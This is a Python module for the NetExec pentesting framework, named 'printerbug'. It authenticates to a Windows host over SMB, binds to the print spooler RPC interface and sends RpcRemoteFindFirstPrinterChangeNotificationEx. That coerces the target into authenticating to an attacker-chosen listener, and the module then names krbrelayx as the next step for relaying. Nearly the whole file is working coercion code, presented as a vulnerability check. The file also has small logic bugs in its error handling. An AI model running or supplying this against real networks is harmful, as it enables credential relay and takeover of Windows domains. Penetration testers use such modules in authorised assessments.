from impacket.dcerpc.v5 import transport, rprn
from nxc.logger import nxc_logger


class NXCModule:
    name = "printerbug"
    description = "Module to check if the Target is vulnerable to PrinterBug"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.listener = None

    def options(self, context, module_options):
        """LISTENER    Listener Address (defaults to 127.0.0.1)"""
        self.listener = "127.0.0.1"
        if "LISTENER" in module_options:
            self.listener = module_options["LISTENER"]

    def on_login(self, context, connection):
        trigger = TriggerAuth()
        target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
        dce = trigger.connect(
            username=connection.username,
            password=connection.password,
            domain=connection.domain,
            lmhash=connection.lmhash,
            nthash=connection.nthash,
            target=target,
            doKerberos=connection.kerberos,
            dcHost=connection.kdcHost,
            aesKey=connection.aesKey,
        )

        if dce is not None:
            context.log.debug("Target is vulnerable to PrinterBug")
            trigger.RpcRemoteFindFirstPrinterChange(dce, self.listener, target)
            context.log.highlight("VULNERABLE")
            context.log.highlight("Next step: https://github.com/dirkjanm/krbrelayx")
            dce.disconnect()

        else:
            context.log.debug("Target is not vulnerable to PrinterBug")


################################################################################
# RPC CALLS
################################################################################



class TriggerAuth:
    def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost):
        
        rpctransport = transport.DCERPCTransportFactory(r"ncacn_np:%s[\PIPE\spoolss]" % target)
        rpctransport.set_dport(445)

        if hasattr(rpctransport, "set_credentials"):
            rpctransport.set_credentials(
                username=username,
                password=password,
                domain=domain,
                lmhash=lmhash,
                nthash=nthash,
                aesKey=aesKey,
            )

        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
        # if target:

        rpctransport.setRemoteHost(target)
        dce = rpctransport.get_dce_rpc()
        nxc_logger.debug("[-] Connecting to {}".format(r"ncacn_np:%s[\PIPE\spoolfs]") % target)
        try:
            dce.connect()
        except Exception as e:
            nxc_logger.debug(f"Something went wrong, check error status => {e!s}")
            return None
        try:
            dce.bind(rprn.MSRPC_UUID_RPRN)            
        except Exception as e:
            nxc_logger.debug(f"Something went wrong, check error status => {e!s}")
            return None
        nxc_logger.debug("[+] Successfully bound!")
        return dce

    def RpcRemoteFindFirstPrinterChange(self, dce, listener, target):
        nxc_logger.debug("[-] Sending RpcRemoteFindFirstPrinterChange!")
        try:
            resp = rprn.hRpcOpenPrinter(dce, "\\\\%s\x00" % target)
        except Exception as e:
            if str(e).find("Broken pipe") >= 0:
                # The connection timed-out. Let's try to bring it back next round
                nxc_logger.error("Connection failed - skipping host!")
                return
            elif str(e).upper().find("ACCESS_DENIED"):
                # We're not admin, bye
                nxc_logger.error("Access denied - RPC call was denied")
                dce.disconnect()
                return
            else:
                raise
        nxc_logger.debug("Got handle")

        try:
            request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
            request["hPrinter"] = resp["pHandle"]
            request["fdwFlags"] = rprn.PRINTER_CHANGE_ADD_JOB
            request["pszLocalMachine"] = "\\\\%s\x00" % listener
            request["pOptions"] = None
            nxc_logger.debug(request.dump())
        except Exception as e:
            nxc_logger.debug(e)

        try:
            dce.request(request)
        except Exception as e:
            nxc_logger.debug(e)
